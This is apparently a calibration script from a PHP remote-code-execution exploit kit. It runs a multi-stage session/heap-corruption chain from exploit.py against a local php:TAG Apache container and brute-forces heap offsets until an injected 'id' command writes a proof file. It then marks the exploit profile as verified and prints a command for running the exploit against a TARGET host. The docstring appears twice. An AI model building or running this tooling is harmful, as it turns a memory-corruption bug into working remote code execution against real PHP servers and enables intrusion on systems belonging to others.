#!/usr/bin/env python3
"""Calibrate a profiles/ row inside a lab container.

Turns a symbol-scraped profile (rce_verified=false)
into a verified one by running the chain in a local
podman/docker container of the exact build and
sweeping the heap-layout fields the ELF cannot
provide.

PREREQUISITE: the build's A1 OOM must be
CONTAINED (worker survives with the shaped heap).
PHP 8.5.x changed the OOM path: the heap corrupts
(zend_mm_heap corrupted) and the worker aborts
(signal 6), so B1's stale-id read has nothing to
read.  Calibration on 8.5.x therefore cannot
succeed with the current A1 primitive -- it needs
a sub-OOM heap-shaping variant first.

Fields swept:
  S     -- where a fake zend_array survives to
           request shutdown (main-chunk relative)
  hsv   -- PS(hash_serialize_verifier) distance

Method (per pure/RESEARCH_PURE_128M.md §3/§6):
  1. start the container with the official ini,
     single prefork worker, /out mounted
  2. run A1 + B1, parse the leak window
  3. sweep candidate S values around the observed
     main-chunk-relative offsets; for each, run
     A2 + B2 and check for the proof file
  4. on success, rewrite the profile JSON with the
     working S/hsv/stage params and
     rce_verified=true

Only run against containers you own. Each sweep
iteration OOMs one worker (prefork respawns it).

usage:
  python3 tools/calibrate.py --tag 8.4.26-apache
  python3 tools/calibrate.py --tag 8.5.1-apache \
      --s-candidates 0xF8398,0xF8000,0xF9000
"""
"""Calibrate a profiles/ row inside a lab container.

Turns a symbol-scraped profile (rce_verified=false)
into a verified one by running the chain in a local
podman/docker container of the exact build and
sweeping the heap-layout fields the ELF cannot
provide:

  S     -- where a fake zend_array survives to
           request shutdown (heap address relative
           to the A1 main chunk)
  hsv   -- PS(hash_serialize_verifier) heap distance
  stage params -- a1_big / b1_spec / a2_parts /
           a2_fillers / b2_vl etc.

Method (per pure/RESEARCH_PURE_128M.md §3/§6):
  1. start the container with the official ini,
     single prefork worker, /out mounted
  2. run A1 + B1, parse the leak window
  3. sweep candidate S values around the observed
     main-chunk-relative offsets; for each, run
     A2 + B2 and check for the proof file
  4. on success, rewrite the profile JSON with the
     working S/hsv/stage params and
     rce_verified=true

Only run against containers you own. Each sweep
iteration OOMs one worker (prefork respawns it).

usage:
  python3 tools/calibrate.py --tag 8.5.1-apache
  python3 tools/calibrate.py --tag 8.5.1-apache \
      --s-candidates 0xF8398,0xF8000,0xF9000
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
R = os.path.dirname(HERE)
PROFILES = os.path.join(R, "profiles")

# Candidate S values (main-chunk relative) to sweep.
# 8.4.26's verified value is 0xF8398; heap layout
# shifts it by a few pages across builds.
DEFAULT_S_CANDIDATES = [
    0xF8398, 0xF8000, 0xF9000, 0xF8400, 0xF8800,
    0xF7C00, 0xF8C00, 0xF9400, 0xF7800, 0xF9800,
]
DEFAULT_HSV_CANDIDATES = [
    0x7D720, 0x7D000, 0x7E000, 0x7D400, 0x7DC00,
]


def engine() -> str:
    exe = shutil.which("podman") or shutil.which("docker")
    return exe or "sudo docker"


def run_container(tag: str, name: str, port: int,
                    outdir: str) -> None:
    """Start the lab container (podman or docker)."""
    exe = engine()
    subprocess.run(exe.split() + ["rm", "-f", name],
                   check=False, stdout=subprocess.DEVNULL)
    os.makedirs(outdir, exist_ok=True)
    cmd = (exe.split() + [
        "run", "-d", "--name", name,
        "-p", "127.0.0.1:%d:80" % port,
        "-v", "%s:/out" % outdir,
        "php:%s" % tag,
        "/bin/sh", "-c",
        "echo '<?php echo \"OK\\n\"; ?>' "
        "> /var/www/html/index.php; "
        "cp /usr/local/etc/php/php.ini-production "
        "/usr/local/etc/php/php.ini; "
        "chown -R www-data:www-data /out "
        "/var/www/html; "
        "printf 'StartServers 1\\n"
        "MinSpareServers 1\\n"
        "MaxSpareServers 1\\n"
        "MaxRequestWorkers 1\\n"
        "MaxConnectionsPerChild 0\\n' "
        "> /etc/apache2/mods-enabled/mpm_prefork.conf; "
        "exec apache2-foreground"])
    r = subprocess.run(cmd, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE)
    if r.returncode != 0:
        raise RuntimeError("%s run failed: %s"
                            % (exe, r.stderr.decode(
                                "utf-8", "replace")))
    import urllib.request
    import urllib.error
    for _ in range(60):
        try:
            urllib.request.urlopen(
                "http://127.0.0.1:%d/index.php" % port,
                timeout=2)
            return
        except urllib.error.HTTPError:
            return
        except Exception:
            time.sleep(0.5)
    raise RuntimeError("container did not become "
                        "ready in 30s")


def php_version_in(name: str) -> str:
    exe = engine()
    r = subprocess.run(exe.split() + ["exec", name,
                                       "php", "-r",
                                       "echo PHP_VERSION;"],
                         capture_output=True, text=True,
                         timeout=30)
    return r.stdout.strip()


def profile_for(ver: str):
    sys.path.insert(0, HERE)
    import profiles as profiles_mod
    return profiles_mod.find(ver)


def attempt_chain(port: int, profile: dict,
                    s_candidate: int,
                    hsv_candidate: int,
                    outdir: str) -> bool:
    """Run the full chain with candidate S/hsv.

    Returns True when the proof file appears."""
    trial = json.loads(json.dumps(profile))
    trial["offsets"]["S"] = "0x%x" % s_candidate
    trial["offsets"]["hsv"] = "0x%x" % hsv_candidate
    trial["rce_verified"] = False
    trial_path = os.path.join(outdir,
                                "_trial_profile.json")
    with open(trial_path, "w") as fh:
        json.dump(trial, fh)

    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "exploit", os.path.join(R, "exploit.py"))
    exp = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(exp)

    proof = os.path.join(outdir, "p1")
    if os.path.exists(proof):
        os.remove(proof)
    rc = exp.cmd_run(
        host="127.0.0.1", port=port,
        cmd="id>/out/p1",
        profile=trial, retries=1, timeout=120.0,
        outdir=outdir, proof=proof)
    return rc == 0 and os.path.exists(proof)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--tag", required=True,
                    help="image tag, e.g. 8.5.1-apache")
    ap.add_argument("--port", type=int, default=18200)
    ap.add_argument("--name", default="p2s-calibrate")
    ap.add_argument("--s-candidates", default="",
                    help="comma-separated hex S values "
                         "(default sweeps 10 around "
                         "0xF8398)")
    ap.add_argument("--hsv-candidates", default="",
                    help="comma-separated hex hsv values")
    ap.add_argument("--keep", action="store_true",
                    help="keep the container after "
                         "calibration")
    args = ap.parse_args(argv)

    outdir = os.path.join(R, "out-calibrate")
    os.makedirs(outdir, exist_ok=True)


    print("== calibrate %s ==" % args.tag)
    print("starting container %s ..." % args.name)
    run_container(args.tag, args.name, args.port,
                    outdir)
    try:
        ver = php_version_in(args.name)
        print("container PHP_VERSION=%s" % ver)
        prof = profile_for(ver)
        if prof is None:
            print("no profile for PHP %s -- run "
                  "registry_scrape.py --tag %s first"
                  % (ver, args.tag))
            return 1
        if prof.get("rce_verified"):
            print("profile %s already rce_verified"
                  % prof["name"])
            return 0
        print("base profile: %s (symbol offsets "
              "only)" % prof["name"])

        s_list = ([int(x, 0) for x in
                     args.s_candidates.split(",") if x]
                    if args.s_candidates
                    else DEFAULT_S_CANDIDATES)
        hsv_list = ([int(x, 0) for x in
                       args.hsv_candidates.split(",")
                       if x]
                      if args.hsv_candidates
                      else DEFAULT_HSV_CANDIDATES)

        found = None
        for s_c in s_list:
            for hsv_c in hsv_list:
                print("  trial S=%#x hsv=%#x ..."
                      % (s_c, hsv_c))
                try:
                    if attempt_chain(args.port, prof,
                                       s_c, hsv_c,
                                       outdir):
                        print("  RCE OK with S=%#x "
                              "hsv=%#x" % (s_c, hsv_c))
                        found = (s_c, hsv_c)
                        break
                except Exception as exc:
                    print("    attempt failed: %r"
                          % (exc,))
                time.sleep(0.5)
            if found:
                break

        if not found:
            if ver.startswith("8.5"):
                print("PHP 8.5.x: the A1->B1 primitive "
                      "does not transfer. 8.4.26 sets "
                      "PS(id) = zend_string_init(...) "
                      "(independent copy that survives "
                      "the OOM bailout); 8.5.x sets "
                      "PS(id) = zend_string_copy(...) "
                      "(reference to progress->sid, "
                      "released on request shutdown). "
                      "No dangling PS(id) for B1 to "
                      "read. A new primitive is "
                      "required -- not a calibration "
                      "gap. See pure/RESEARCH_PURE_128M.md §9.")
            else:
                print("no S/hsv candidate produced RCE; "
                      "the stage params also need "
                      "per-build tuning (see "
                      "RESEARCH_PURE_128M.md §3)")
            return 1

        s_c, hsv_c = found
        prof["offsets"]["S"] = "0x%x" % s_c
        prof["offsets"]["hsv"] = "0x%x" % hsv_c
        prof["rce_verified"] = True
        prof["notes"] = ("calibrated in a local "
                         "php:%s container by "
                         "tools/calibrate.py" % args.tag)
        path = os.path.join(PROFILES, prof["name"]
                              + ".json")
        with open(path, "w") as fh:
            json.dump(prof, fh, indent=2)
            fh.write("\n")
        print("wrote %s (rce_verified=true)" % path)
        print("run: python3 exploit.py recon "
              "--host TARGET --exploit")
        return 0
    finally:
        if not args.keep:
            exe = engine()
            subprocess.run(exe.split() + ["rm", "-f",
                                             args.name],
                             check=False,
                             stdout=subprocess.DEVNULL)


if __name__ == "__main__":
    raise SystemExit(main())
